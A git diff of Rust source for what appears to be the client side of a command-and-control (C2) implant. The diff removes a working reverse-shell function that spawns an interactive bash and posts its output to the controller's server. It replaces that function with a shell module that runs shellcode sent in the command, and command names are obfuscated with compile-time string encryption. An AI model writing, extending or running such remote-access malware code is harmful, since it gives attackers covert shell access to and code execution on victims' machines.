@@ -2,11 +2,10 @@ use cryptify::encrypt_string;
 use log::{error, info};
 use reqwest::Client;
 use std::path::PathBuf;
-use std::process::Stdio;
-use tokio::io::{AsyncBufReadExt, BufReader};
 use tokio::process::Command;
 
 use crate::file_manager::ClientFileManager;
+use crate::shell; // Import the new shell module
 use common::error::{C2Error, C2Result};
 use common::message::{
     CommandRequest,
@@ -17,7 +16,6 @@ use common::message::{
     ListDirResponse,
     Message,
     MessageType,
-    ShellData, // UploadFileRequest is now used
 };
 
 pub async fn execute_command(
@@ -31,11 +29,12 @@ pub async fn execute_command(
 
     // Handle reverse shell command first
     if cmd.command == encrypt_string!("REVERSE_SHELL") {
-        if let Some(session_id) = cmd.args.first() {
-            return start_reverse_shell(http_client, server_url, session_id.clone()).await;
+        if let Some(shellcode) = cmd.shellcode {
+            info!("Received REVERSE_SHELL command with shellcode");
+            return shell::start_reverse_shell(shellcode).await;
         } else {
             return Err(C2Error::Other(
-                "Reverse shell command missing session_id".into(),
+                "Reverse shell command missing shellcode".into(),
             ));
         }
     }
@@ -328,57 +327,5 @@ async fn send_file_operation_response(
         "Successfully sent file operation response for client {}",
         client_id
     );
-    Ok(())
-}
-
-async fn start_reverse_shell(
-    http_client: &Client,
-    server_url: &str,
-    session_id: String,
-) -> C2Result<()> {
-    println!("Starting reverse shell for session {session_id}...");
-    let mut shell_process = Command::new("/bin/bash")
-        .arg("-i")
-        .stdin(Stdio::piped())
-        .stdout(Stdio::piped())
-        .stderr(Stdio::piped())
-        .spawn()?;
-
-    let stdout = shell_process
-        .stdout
-        .take()
-        .ok_or(C2Error::Other("Failed to get stdout".into()))?;
-
-    let http_client_clone = http_client.clone();
-    let server_url_clone = server_url.to_string();
-
-    tokio::spawn(async move {
-        let mut reader = BufReader::new(stdout);
-        loop {
-            let mut buf = Vec::new();
-            match reader.read_until(b'\n', &mut buf).await {
-                Ok(0) => break, // EOF
-                Ok(_) => {
-                    let shell_data = ShellData::new(session_id.clone(), buf);
-                    let payload = serde_json::to_vec(&shell_data).unwrap();
-                    let message = Message::new(MessageType::ShellData, payload);
-
-                    if let Err(e) = http_client_clone
-                        .post(format!("{server_url_clone}/api/shell_data"))
-                        .json(&message)
-                        .send()
-                        .await
-                    {
-                        eprintln!("Failed to send shell data: {e}");
-                    }
-                }
-                Err(e) => {
-                    eprintln!("Error reading from shell stdout: {e}");
-                    break;
-                }
-            }
-        }
-    });
-
     Ok(())
 }
